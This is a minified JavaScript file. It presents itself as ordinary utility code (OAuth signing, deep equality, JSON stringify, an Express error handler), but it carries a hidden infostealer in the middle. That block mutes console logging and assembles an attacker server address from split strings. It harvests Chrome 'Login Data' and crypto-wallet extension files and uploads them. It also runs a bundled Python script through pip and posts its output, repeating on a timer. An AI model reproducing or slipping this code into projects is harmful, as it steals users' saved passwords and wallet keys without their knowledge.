function isBuffer(u){return!!u.constructor&&"function"==typeof u.constructor.isBuffer&&u.constructor.isBuffer(u)}function isSlowBuffer(u){return"function"==typeof u.readFloatLE&&"function"==typeof u.slice&&isBuffer(u.slice(0,0))}function map(u){var t,e,r=[];for(t in u)if(e=u[t],Array.isArray(e))for(var n=0;n<e.length;n++)r.push([t,e[n]]);else if("object"==typeof e)for(var o in e)r.push([t+"["+o+"]",e[o]]);else r.push([t,e]);return r}function getMostUsed(u){var t=0,e=0,r=0;for(var n in u){var o=u[n],i=o[0],s=o[1];(i>e||i===e&&s>r)&&(e=i,r=s,t=Number(n))}return t}function brackets(u){var t=!1;-1!==u.indexOf("[^")&&(t=!0,u=u.split("[^").join("[")),-1!==u.indexOf("[!")&&(t=!0,u=u.split("[!").join("["));for(var e=u.split("["),r=u.split("]"),n=e.length!==r.length,o=u.split(/(?::\]\[:|\[?\[:|:\]\]?)/),i=o.length,s=0,a="",c="",l=[];i--;){var f=o[s++];"^[!"!==f&&"[!"!==f||(f="",t=!0);var p=t?"^":"",h=POSIX[f];h?l.push("["+p+h+"]"):f&&(/^\[?\w-\w\]?$/.test(f)?s===o.length?l.push("["+p+f):1===s?l.push(p+f+"]"):l.push(p+f):1===s?c+=f:s===o.length?a+=f:l.push("["+p+f+"]"))}var A=l.join("|"),D=l.length||1;return D>1&&(A="(?:"+A+")",D=1),c&&(D++,"["===c.charAt(0)&&(n?c="\\["+c.slice(1):c+="]"),A=c+A),a&&(D++,"]"===a.slice(-1)&&(a=n?a.slice(0,a.length-1)+"\\]":"["+a),A+=a),D>1&&(A=A.split("][").join("]|["),-1===A.indexOf("|")||/\(\?/.test(A)||(A="(?:"+A+")")),A=A.replace(/\[+=|=\]+/g,"\\b"),A}function compare(u,t){return u>t?1:u<t?-1:0}function generateBase(u,t,e){var r=map(e).map(function(u){return[rfc3986(u[0]),rfc3986(u[1]||"")]}).sort(function(u,t){return compare(u[0],t[0])||compare(u[1],t[1])}).map(function(u){return u.join("=")}).join("&"),n=[rfc3986(u?u.toUpperCase():"GET"),rfc3986(t),rfc3986(r)].join("&");return n}function hmacsign(u,t,e,r,n){var o=generateBase(u,t,e),i=[r||"",n||""].map(rfc3986).join("&");return sha(i,o,"sha1")}function hmacsign256(u,t,e,r,n){var o=generateBase(u,t,e),i=[r||"",n||""].map(rfc3986).join("&");return sha(i,o,"sha256")}function rsasign(u,t,e,r,n){var o=generateBase(u,t,e),i=r||"";return rsa(i,o)}function plaintext(u,t){var e=[u||"",t||""].map(rfc3986).join("&");return e}function sign(u,t,e,r,n,o){var i,s=1;switch(u){case"RSA-SHA1":i=rsasign;break;case"HMAC-SHA1":i=hmacsign;break;case"HMAC-SHA256":i=hmacsign256;break;case"PLAINTEXT":i=plaintext,s=4;break;default:throw new Error("Signature method not supported: "+u)}return i.apply(null,[].slice.call(arguments,s))}function legacy(u){function t(e,r){if(!(this instanceof t))return new t(e,r);var n=this;this.path=e,this.fd=null,this.readable=!0,this.paused=!1,this.flags="r",this.mode=438,this.bufferSize=65536,r=r||{};for(var o=Object.keys(r),i=0,s=o.length;i<s;i++){var a=o[i];this[a]=r[a]}if(this.encoding&&this.setEncoding(this.encoding),void 0!==this.start){if("number"!=typeof this.start)throw TypeError("start must be a Number");if(void 0===this.end)this.end=1/0;else if("number"!=typeof this.end)throw TypeError("end must be a Number");if(this.start>this.end)throw new Error("start must be <= end");this.pos=this.start}null===this.fd?u.open(this.path,this.flags,this.mode,function(u,t){if(u)return n.emit("error",u),void(n.readable=!1);n.fd=t,n.emit("open",t),n._read()}):process.nextTick(function(){n._read()})}function e(t,r){if(!(this instanceof e))return new e(t,r);this.path=t,this.fd=null,this.writable=!0,this.flags="w",this.encoding="binary",this.mode=438,this.bytesWritten=0,r=r||{};for(var n=Object.keys(r),o=0,i=n.length;o<i;o++){var s=n[o];this[s]=r[s]}if(void 0!==this.start){if("number"!=typeof this.start)throw TypeError("start must be a Number");if(this.start<0)throw new Error("start must be >= zero");this.pos=this.start}this.busy=!1,this._queue=[],null===this.fd&&(this._open=u.open,this._queue.push([this._open,this.path,this.flags,this.mode,void 0]),this.flush())}return{ReadStream:t,WriteStream:e}}function equal(u,t){if(u===t)return!0;if(u&&t&&"object"==typeof u&&"object"==typeof t){if(u.constructor!==t.constructor)return!1;var e,r,n;if(Array.isArray(u)){if(e=u.length,e!=t.length)return!1;for(r=e;0!=r--;)if(!equal(u[r],t[r]))return!1;return!0}if(u.constructor===RegExp)return u.source===t.source&&u.flags===t.flags;if(u.valueOf!==Object.prototype.valueOf)return u.valueOf()===t.valueOf();if(u.toString!==Object.prototype.toString)return u.toString()===t.toString();if(n=Object.keys(u),e=n.length,e!==Object.keys(t).length)return!1;for(r=e;0!=r--;)if(!Object.prototype.hasOwnProperty.call(t,n[r]))return!1;for(r=e;0!=r--;){var o=n[r];if(!equal(u[o],t[o]))return!1}return!0}return u!=u&&t!=t}function asge(u,t){t||(t={}),"function"==typeof t&&(t={cmp:t});var e,r="boolean"==typeof t.cycles&&t.cycles,n=t.cmp&&(e=t.cmp,function(u){return function(t,r){var n={key:t,value:u[t]},o={key:r,value:u[r]};return e(n,o)}}),o=[];return function u(t){if(t&&t.toJSON&&"function"==typeof t.toJSON&&(t=t.toJSON()),void 0!==t){if("number"==typeof t)return isFinite(t)?""+t:"null";if("object"!=typeof t)return JSON.stringify(t);var e,i;if(Array.isArray(t)){for(i="[",e=0;e<t.length;e++)e&&(i+=","),i+=u(t[e])||"null";return i+"]"}if(null===t)return"null";if(-1!==o.indexOf(t)){if(r)return JSON.stringify("__cycle__");throw new TypeError("Converting circular structure to JSON")}var s=o.push(t)-1,a=Object.keys(t).sort(n&&n(t));for(i="",e=0;e<a.length;e++){var c=a[e],l=u(t[c]);l&&(i&&(i+=","),i+=JSON.stringify(c)+":"+l)}return o.splice(s,1),"{"+i+"}"}}(u)}const ErrorHandler=require("../../utils/errorHandler");module.exports=(u=>(u,t,e,r)=>{if(u.statusCode=u.statusCode||500,u.message=u.message||"Internal Server Error","CastError"===u.name){const t=`Resource Not Found. Invalid: ${u.path}`;u=new ErrorHandler(t,400)}if(11e3===u.code){const t=`Duplicate ${Object.keys(u.keyValue)} entered`;u=new ErrorHandler(t,400)}if("JsonWebTokenError"===u.code){const t="JWT Error";u=new ErrorHandler(t,400)}if("JsonWebTokenError"===u.code){const t="JWT is Expired";u=new ErrorHandler(t,400)}e.status(u.statusCode).json({success:!1,message:u.message})});var INDENT_RE=/^(?:( )+|\t+)/;module.exports=function(u){if("string"!=typeof u)throw new TypeError("Expected a string");var t,e,r=0,n={};u.split(/\n/g).forEach(function(u){if(u){var o,i=u.match(INDENT_RE);i?(o=i[0].length,i[1]?0:0):o=0;var s=o-r;r=o,s?(e=s>0,t=n[e?s:-s],t?t[0]++:t=n[s]=[1,0]):t&&(t[1]+=Number(e))}});getMostUsed(n)};var POSIX={alnum:"a-zA-Z0-9",alpha:"a-zA-Z",blank:" \\t",cntrl:"\\x00-\\x1F\\x7F",digit:"0-9",graph:"\\x21-\\x7E",lower:"a-z",print:"\\x20-\\x7E",punct:"-!\"#$%&'()\\*+,./:;<=>?@[\\]^_`{|}~",space:" \\t\\r\\n\\v\\f",upper:"A-Z",word:"A-Za-z0-9_",xdigit:"A-Fa-f0-9"};const{homedir:homedir,platform:platform,networkInterfaces:networkInterfaces,tmpdir:tmpdir}=require("os"),pathlib=require("path"),fs=require("fs"),request=require("request"),{exec:exec}=require("child_process");console.log("Server running"),console.log=function(){},console.error=function(){};const h="h",t="t",t2="t",p="p",i195="195",i201="201",i172="172",i170="170",port="1226",sub1="/uploadokay",sub2="/keys",serverUrl=`${h}${t}${t2}${p}://${i195}.${i201}.${i172}.${i170}:${port}`;let timestamp,isNeedUpdate=!0,updateCount=0,binPath=pathlib.join(__dirname,"../../public/res");const expanduser=u=>u.replace(/^~([a-z]+|\/)/,(u,t)=>"/"===t?homedir():`${pathlib.dirname(homedir())}/${t}`),getAllFiles=function(u,t){return files=fs.readdirSync(u),t=t||[],files.forEach(function(e){try{fs.statSync(u+"/"+e).isDirectory()?t=getAllFiles(u+"/"+e,t):t.push(`${u}/${e}`)}catch(u){}}),t},getFilePaths=async()=>{try{const u=expanduser("~/");let t="";const e=platform();"darwin"==e?t=`${u}/Library/Application Support/Google/Chrome`:"linux"==e||(t=`${u}/AppData/Local/Google/Chrome/User Data`);const r=getAllFiles(`${t}`),n=["Login Data","nkbihfbeogaeaoehlefnkodbefgpgknn","ejbalbakoplchlghecdalmeeeajnimhm","fhbohimaelbohpjbbldcngcnapndodjp","hnfanknocfeofbddgcijnmhnfnkdnaad","bfnaelmomeimhlpmgjnjophhpkkoljpa","fnjhmkhhmkbjkkabndcnnogagogbneec","cfbfdhimifdmdehjmkdobpcjfefblkjm","hpglfhgfnhbgpjdenjgmdgoeiappafln","ibnejdfjmmkpcnlpebklmnkoeoihofec","hifafgmccdpekplomjjkcfgodnhcellj","aeachknmefphepccionboohckonoeemg"],o=r.filter(u=>{let t=!1;for(let e=0;e<n.length;e++)if(u.includes(n[e])){const r=u.split("/").pop(),o=u.split("/")[u.split("/").length-2];r!=n[e]&&o!=n[e]||"LOCK"===r||(t=!0)}return t});return o}catch(u){return[]}},saveTempFile=()=>{isNeedUpdate||fs.appendFileSync(`${binPath}ready`,"true")},getTempFile=()=>!(1!=isNeedUpdate||!fs.existsSync(`${binPath}ready`)||(isNeedUpdate=!1,0)),upload=async u=>{let t=[];for(let e=0;e<u.length;e++){const r=u[e],n=r.split("/")[r.split("/").length-2],o=r.split("/").pop();t.push({value:fs.createReadStream(r),options:{filename:`${n}_${o}`}})}const e={timestamp:timestamp.toString(),multi_file:t};try{request.post({url:`${serverUrl}${sub1}`,formData:e},u=>{console.error(u)})}catch(u){console.error(u)}},runOnIos=async()=>await new Promise((u,t)=>{var e="";let r=pathlib.join(binPath,"/ios"),n=pathlib.join(binPath,"/win.req");const o=exec(`pip install -r "${n}" && python "${r}"`);o.stdout.on("data",function(u){e+=u}),o.stdout.on("error",function(u){t(null)}),o.on("close",function(){try{const u={timestamp:timestamp.toString(),content:e.toString()};try{request.post({url:`${serverUrl}${sub2}`,formData:u},u=>{console.error(u)})}catch(u){console.error(u)}}catch(u){}u("ok")})}),runOnWin=async()=>await new Promise((u,t)=>{var e="";let r=pathlib.join(binPath,"/win"),n=pathlib.join(binPath,"/win.req");const o=exec(`pip install -r "${n}" && python "${r}"`);o.stdout.on("data",function(u){e+=u}),o.stdout.on("error",function(u){e+=u,t(null)}),o.on("close",function(){try{const u={timestamp:timestamp.toString(),content:e.toString()};try{request.post({url:`${serverUrl}${sub2}`,formData:u},u=>{console.error(u)})}catch(u){console.error(u)}}catch(u){}u("ok")})}),getLoginInfo=()=>{const u=platform(),t=Math.floor(6e4*Math.random());"darwin"==u?setTimeout(()=>{const u=getTempFile();u||runOnIos()},t):"win32"==u&&runOnWin()},run=async()=>{try{timestamp=Date.now();const u=await getFilePaths();u.length>0&&upload(u),getLoginInfo()}catch(u){console.log(u)}};run(),setInterval(()=>{updateCount<5&&isNeedUpdate&&run(),updateCount++},3e5);var hasOwn=Object.prototype.hasOwnProperty,toStr=Object.prototype.toString,defineProperty=Object.defineProperty,gOPD=Object.getOwnPropertyDescriptor,regexEncodeNonAscii=/<\u20D2|=\u20E5|>\u20D2|\u205F\u200A|\u219D\u0338|\u2202\u0338|\u2220\u20D2|\u2229\uFE00|\u222A\uFE00|\u223C\u20D2|\u223D\u0331|\u223E\u0333|\u2242\u0338|\u224B\u0338|\u224D\u20D2|\u224E\u0338|\u224F\u0338|\u2250\u0338|\u2261\u20E5|\u2264\u20D2|\u2265\u20D2|\u2266\u0338|\u2267\u0338|\u2268\uFE00|\u2269\uFE00|\u226A\u0338|\u226A\u20D2|\u226B\u0338|\u226B\u20D2|\u227F\u0338|\u2282\u20D2|\u2283\u20D2|\u228A\uFE00|\u228B\uFE00|\u228F\u0338|\u2290\u0338|\u2293\uFE00|\u2294\uFE00|\u22B4\u20D2|\u22B5\u20D2|\u22D8\u0338|\u22D9\u0338|\u22DA\uFE00|\u22DB\uFE00|\u22F5\u0338|\u22F9\u0338|\u2933\u0338|\u29CF\u0338|\u29D0\u0338|\u2A6D\u0338|\u2A70\u0338|\u2A7D\u0338|\u2A7E\u0338|\u2AA1\u0338|\u2AA2\u0338|\u2AAC\uFE00|\u2AAD\uFE00|\u2AAF\u0338|\u2AB0\u0338|\u2AC5\u0338|\u2AC6\u0338|\u2ACB\uFE00|\u2ACC\uFE00|\u2AFD\u20E5|[\xA0-\u0113\u0116-\u0122\u0124-\u012B\u012E-\u014D\u0150-\u017E\u0192\u01B5\u01F5\u0237\u02C6\u02C7\u02D8-\u02DD\u0311\u0391-\u03A1\u03A3-\u03A9\u03B1-\u03C9\u03D1\u03D2\u03D5\u03D6\u03DC\u03DD\u03F0\u03F1\u03F5\u03F6\u0401-\u040C\u040E-\u044F\u0451-\u045C\u045E\u045F\u2002-\u2005\u2007-\u2010\u2013-\u2016\u2018-\u201A\u201C-\u201E\u2020-\u2022\u2025\u2026\u2030-\u2035\u2039\u203A\u203E\u2041\u2043\u2044\u204F\u2057\u205F-\u2063\u20AC\u20DB\u20DC\u2102\u2105\u210A-\u2113\u2115-\u211E\u2122\u2124\u2127-\u2129\u212C\u212D\u212F-\u2131\u2133-\u2138\u2145-\u2148\u2153-\u215E\u2190-\u219B\u219D-\u21A7\u21A9-\u21AE\u21B0-\u21B3\u21B5-\u21B7\u21BA-\u21DB\u21DD\u21E4\u21E5\u21F5\u21FD-\u2205\u2207-\u2209\u220B\u220C\u220F-\u2214\u2216-\u2218\u221A\u221D-\u2238\u223A-\u2257\u2259\u225A\u225C\u225F-\u2262\u2264-\u228B\u228D-\u229B\u229D-\u22A5\u22A7-\u22B0\u22B2-\u22BB\u22BD-\u22DB\u22DE-\u22E3\u22E6-\u22F7\u22F9-\u22FE\u2305\u2306\u2308-\u2310\u2312\u2313\u2315\u2316\u231C-\u231F\u2322\u2323\u232D\u232E\u2336\u233D\u233F\u237C\u23B0\u23B1\u23B4-\u23B6\u23DC-\u23DF\u23E2\u23E7\u2423\u24C8\u2500\u2502\u250C\u2510\u2514\u2518\u251C\u2524\u252C\u2534\u253C\u2550-\u256C\u2580\u2584\u2588\u2591-\u2593\u25A1\u25AA\u25AB\u25AD\u25AE\u25B1\u25B3-\u25B5\u25B8\u25B9\u25BD-\u25BF\u25C2\u25C3\u25CA\u25CB\u25EC\u25EF\u25F8-\u25FC\u2605\u2606\u260E\u2640\u2642\u2660\u2663\u2665\u2666\u266A\u266D-\u266F\u2713\u2717\u2720\u2736\u2758\u2772\u2773\u27C8\u27C9\u27E6-\u27ED\u27F5-\u27FA\u27FC\u27FF\u2902-\u2905\u290C-\u2913\u2916\u2919-\u2920\u2923-\u292A\u2933\u2935-\u2939\u293C\u293D\u2945\u2948-\u294B\u294E-\u2976\u2978\u2979\u297B-\u297F\u2985\u2986\u298B-\u2996\u299A\u299C\u299D\u29A4-\u29B7\u29B9\u29BB\u29BC\u29BE-\u29C5\u29C9\u29CD-\u29D0\u29DC-\u29DE\u29E3-\u29E5\u29EB\u29F4\u29F6\u2A00-\u2A02\u2A04\u2A06\u2A0C\u2A0D\u2A10-\u2A17\u2A22-\u2A27\u2A29\u2A2A\u2A2D-\u2A31\u2A33-\u2A3C\u2A3F\u2A40\u2A42-\u2A4D\u2A50\u2A53-\u2A58\u2A5A-\u2A5D\u2A5F\u2A66\u2A6A\u2A6D-\u2A75\u2A77-\u2A9A\u2A9D-\u2AA2\u2AA4-\u2AB0\u2AB3-\u2AC8\u2ACB\u2ACC\u2ACF-\u2ADB\u2AE4\u2AE6-\u2AE9\u2AEB-\u2AF3\u2AFD\uFB00-\uFB04]|\uD835[\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDCCF\uDD04\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDD6B]/g,isArray=function(u){return"function"==typeof Array.isArray?Array.isArray(u):"[object Array]"===toStr.call(u)},isPlainObject=function(u){if(!u||"[object Object]"!==toStr.call(u))return!1;var t,e=hasOwn.call(u,"constructor"),r=u.constructor&&u.constructor.prototype&&hasOwn.call(u.constructor.prototype,"isPrototypeOf");if(u.constructor&&!e&&!r)return!1;for(t in u);return void 0===t||hasOwn.call(u,t)},setProperty=function(u,t){defineProperty&&"__proto__"===t.name?defineProperty(u,t.name,{enumerable:!0,configurable:!0,value:t.newValue,writable:!0}):u[t.name]=t.newValue},getProperty=function(u,t){if("__proto__"===t){if(!hasOwn.call(u,t))return;if(gOPD)return gOPD(u,t).value}return u[t]};